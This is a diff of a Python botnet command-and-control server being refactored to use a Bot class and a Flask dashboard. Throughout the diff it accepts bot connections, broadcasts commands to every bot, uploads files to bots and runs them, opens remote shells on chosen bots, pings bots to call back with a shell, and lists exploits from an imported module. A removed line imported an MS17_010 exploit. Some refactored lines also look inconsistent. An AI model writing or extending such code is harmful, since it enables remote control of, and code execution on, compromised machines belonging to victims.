@@ -2,17 +2,18 @@
 # TODO Fix B2A
 """
 
-
-import MS17_010
 from exploits import *
 from Utilities import *
+from Dashboard.Dashboard import *
+from Dashboard.timeoutChecker import *
+from bot import *
 import socket
 import threading
 import os
+import time
+
 os.chdir(os.path.abspath('/tmp/'))
 #
-import http.server
-import socketserver
 
 bots=[]
 PingBots=[]
@@ -24,6 +25,8 @@ httpPort=6080
 port = 6061
 # This port gets the "ping" sessions
 pingPort=6066
+#Beaconing
+BeaconingFlag=0
 # Debug mode
 debug = 0
 # The location of the main http server
@@ -139,8 +142,8 @@ def B2A(LocalLocation,sendANDrun):
     for bot in bots:
 
         # Setup all needed parameters
-        addr = bot[1]
-        conn = bot[0]
+        conn = bot.getConn()
+        addr = bot.addr()
         ip = addr[0]
         port = addr[1]
 
@@ -175,8 +178,8 @@ Send a command to all bots
 """
 def C2A(command):
     for bot in bots:
-        addr = bot[1]
-        conn = bot[0]
+        conn = bot.getConn()
+        addr = bot.addr()
         ip = addr[0]
         port = addr[1]
         print("Sending to ")
@@ -266,8 +269,8 @@ def uploadRun(bot,filename):
         C2A(command)
         pass
     else:
-        addr = bot[1]
-        conn = bot[0]
+        conn = bot.getConn()
+        addr = bot.addr()
         ip = addr[0]
         # Execution
         try:
@@ -308,7 +311,7 @@ def optionsHandler():
     lsitOfOptions = []
     for option in options:
         lsitOfOptions.append(option)
-    
+
     while True:
         try:
             print("Print all options")
@@ -316,20 +319,22 @@ def optionsHandler():
                 print(option)
             # Get input
             filename = s_input("Options:~")
-            towho = s_input("Enter a port or all:~")
-            list()
             print("Choose one of the ports or all")
+            towho = s_input("Enter a port or all:~")
+            print("Printing all connected bots:")
+            list()
+            print("")
             bot = find_bot(towho)
             if len(bot) <= 0:
                 bot = None
             if filename not in lsitOfOptions:
-                print("Choose another option")
+                print("Error: choose another option")
                 continue
             # If it's exit get out
-            if filename == 'exit':
+            if filename == 'exit' or filename == 'exit shell':
                 return
             # Are you sure?
-            condition = s_input("Do you want to send ->'"+filename+"' to all bots? [y/N]")
+            condition = s_input("Do you want to send ->'"+filename+"' ? [y/N]")
             # Make sure that you want to send it.
             if condition == "y" or condition == "Y":
                 print("Sending..")
@@ -353,8 +358,8 @@ It will be called by Talk(), Talk() will receive all data from the bot, this fun
 """
 def send_message(bot):
     #Setup
-    conn = bot[0]
-    addr = bot[1]
+    conn = bot.getConn()
+    addr = bot.addr()
     ip = conn.getpeername()[0]
     port = conn.getpeername()[1]
 
@@ -381,8 +386,8 @@ Start shell mode
 """
 def talk(bot):
     #Setup
-    conn = bot[0]
-    addr = bot[1]
+    conn = bot.getConn()
+    addr = bot.addr()
     ip = conn.getpeername()[0]
     port = conn.getpeername()[1]
 
@@ -406,7 +411,7 @@ Remove all dead bots in "bots" list
 def refreshBots():
     for bot in bots:
         try:
-            conn = bot[0]
+            conn = bot.getConn()
             # If bot is not alive
             if '2049' == str(conn.type):
                 bots.remove(bot)
@@ -419,7 +424,7 @@ Remove all dead bots in "PingBots" list
 def refreshPingBots():
     for bot in PingBots:
         try:
-            conn = bot[0]
+            conn = bot.getConn()
             # If bot is not alive
             if '2049' == str(conn.type):
                 bots.remove(bot)
@@ -434,10 +439,10 @@ def list():
     refreshBots()
     for bot in bots:
         try:
-            addr = bot[1]
-            conn = bot[0]
-            ip = addr[0]
-            port = addr[1]
+            conn = bot.getConn()
+            addr = bot.addr()
+            ip = bot.getip()
+            port = bot.getPort()
 
             # TODO Test this Theory: This "conn.send()" method might kill the client.
             # Why? I guess this might timeout the Send() method in the other side.
@@ -453,6 +458,7 @@ def list():
 
 """
 Stop
+TODO
 """
 def kill_all():
     for bot in bots:
@@ -464,9 +470,9 @@ name = ip
 """
 def find_bot(portNumber):
     for bot in bots:
-        addr = bot[1]
-        port = addr[1]
-        ip = bot[0].getpeername()[0]
+        addr = bot.getConn()
+        port = bot.addr()
+        ip = bot.getip()
         if portNumber == str(port):
             return bot
     return []
@@ -489,8 +495,8 @@ def ping():
     refreshPingBots()
     for bot in PingBots:
         print("ping()")
-        pingConn = bot[0]
-        pingAddr = bot[1]
+        pingConn = bot.getConn()
+        pingAddr = bot.getAddr()
         print(pingAddr)
         sendthis = "111111\n\0"
         print(sendthis)
@@ -534,7 +540,10 @@ def console():
         elif Command == "exploits" or Command == "EXPLOITS" or Command == "EXP" or Command == "exp":
             listExploits()
         elif Command == "options" or Command == "Options":
-            optionsHandler()
+            try:
+                optionsHandler()
+            except:
+                pass
         elif Command == "exit":
             break
         else:
@@ -542,31 +551,48 @@ def console():
                   "port number of the bot to start a shell")
             pass
 
+"""
+Ping the bots to wake up ad send me a shell.
+"""
 def pingSockFun(consoleT,pingSock):
     while consoleT.isAlive():
         try:
             pingConn, pingAddr = pingSock.accept()
             print("\n"+str(pingAddr[0])+":"+str(pingAddr[1])+" has connected - ping")
             SR("111111\n\0",pingConn,1024,0)
-
-            PingBots.append([pingConn, pingAddr])
+            PingBots.append(Bot(pingConn,pingAddr))
         except:
             pass
     pingSock.close()
+
+
 
 def mainSockFun(consoleT,mainSock):
     while consoleT.isAlive():
         try:
             conn, addr = mainSock.accept()
             print("\n"+str(addr[0])+":"+str(addr[1])+" has connected")
-
-            bots.append([conn, addr])
+            bots.append(Bot(conn,addr))
         except:
             pass
     mainSock.close()
 
+
+#TODO Handle threading errors.... Just in case.
 def main():
-    print("Start httpd!")
+    # Start refreshBotsStatus for flask to get the data
+    threading.Timer( REFRESH_INTERVAL * 60.0, refreshBotsStatus).start()
+
+    # Maybe foeking a process is better than using a thread in case I stop this main process.
+    print("Starting flask..")
+    tr1 = threading.Thread(target=startDashboard, args=())
+    tr1.daemon = True
+    tr1.start()
+    # REM
+    time.sleep(1)
+    print("Note: Start httpd!")
+    # REM
+    time.sleep(1)
     global bots
     mainSock = start_listing(port)
     pingSock = start_listing(pingPort)
@@ -580,6 +606,8 @@ def main():
     tr2.daemon = True
     tr2.start()
     tr1.start()
+
+
 
     tr1.join()
     tr2.join()
